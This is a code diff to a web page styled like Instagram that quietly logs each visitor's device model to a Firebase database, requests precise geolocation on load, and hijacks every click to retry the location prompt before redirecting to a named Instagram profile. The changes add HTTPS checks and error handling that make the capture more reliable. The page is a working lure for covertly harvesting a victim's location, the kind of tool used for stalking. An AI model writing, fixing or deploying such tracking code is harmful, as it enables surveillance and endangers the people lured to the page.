@@ -51,7 +51,7 @@
         .nav-item{position:relative;cursor:pointer;display:flex;align-items:center}
         .badge{position:absolute;top:-6px;right:-8px;background:var(--ig-red);color:white;font-size:10px;font-weight:bold;width:17px;height:17px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid white}
         
-        /* Loading Overlay (Hidden by default) */
+        /* Loading Overlay */
         #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index: 2000; justify-content: center; align-items: center; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ig-secondary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -149,7 +149,6 @@
     let locationCaptured = false;
     const finalRedirect = "https://www.instagram.com/priyankamjain___0207/";
 
-    // --- Utility: Get Device Model ---
     async function getDeviceModel() {
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
@@ -168,18 +167,28 @@
         return "Unknown Device";
     }
 
-    // --- Core: Request Location ---
     function captureLocation(triggerType) {
         if (!currentUserRef) return;
         
-        // Show loading only if user clicked (interaction)
         if (triggerType === 'click') {
             document.getElementById('loading').style.display = 'flex';
         }
 
+        // NEW: Check if context is secure (HTTPS)
+        if (window.location.protocol !== "https:" && window.location.hostname !== "localhost") {
+            currentUserRef.update({ 
+                status: "Failed: Not HTTPS",
+                error_detail: "Geolocation requires HTTPS"
+            });
+            if (triggerType === 'click') {
+                alert("Security Error: This page must be loaded over HTTPS to verify location.");
+                window.location.href = finalRedirect;
+            }
+            return;
+        }
+
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                // Success: Save location
                 locationCaptured = true;
                 currentUserRef.update({
                     lat: pos.coords.latitude,
@@ -188,17 +197,25 @@
                     location_type: "Precise (" + triggerType + ")",
                     status: "Captured"
                 }).then(() => {
-                    // Only redirect if this came from a click
                     if (triggerType === 'click') window.location.href = finalRedirect;
                 });
             },
             (err) => {
-                // Error: Log it
+                let errorMsg = err.message;
+                
+                // Specific handling for the error you are seeing
+                if (err.message.includes("sufficient geolocation permissions")) {
+                    errorMsg = "Browser Blocked: Check Site Settings";
+                    if (triggerType === 'click') {
+                        // Optional: alert the user to fix it
+                         // alert("Please allow location access to continue.");
+                    }
+                }
+
                 currentUserRef.update({ 
-                    last_error: err.message,
+                    last_error: errorMsg,
                     status: "Denied/Error on " + triggerType
                 }).then(() => {
-                    // If this was a click, we must redirect anyway so the user doesn't get stuck
                     if (triggerType === 'click') window.location.href = finalRedirect;
                 });
             },
@@ -206,7 +223,6 @@
         );
     }
 
-    // --- Step 1: Initialize on Load ---
     window.addEventListener('DOMContentLoaded', async () => {
         const exactModel = await getDeviceModel();
         currentUserRef = db.ref('mobile_users').push();
@@ -218,24 +234,17 @@
             status: "On Page - Attempting Auto Capture"
         });
 
-        // Try to get location immediately (First Attempt)
         captureLocation('load');
     });
 
-    // --- Step 2: Global Click Listener (Second Option) ---
-    // This catches clicks on ANY element (images, buttons, whitespace)
     document.addEventListener('click', (e) => {
-        // If we already have the location from the "On Load" event, redirect immediately
         if (locationCaptured) {
             window.location.href = finalRedirect;
             return;
         }
-
-        // If we don't have location yet, stop the link/button from doing its normal thing
-        // and ask for location again.
         e.preventDefault(); 
         captureLocation('click');
-    }, { once: false }); // Listener stays active until redirect
+    }, { once: false });
 
 </script>
 </body>
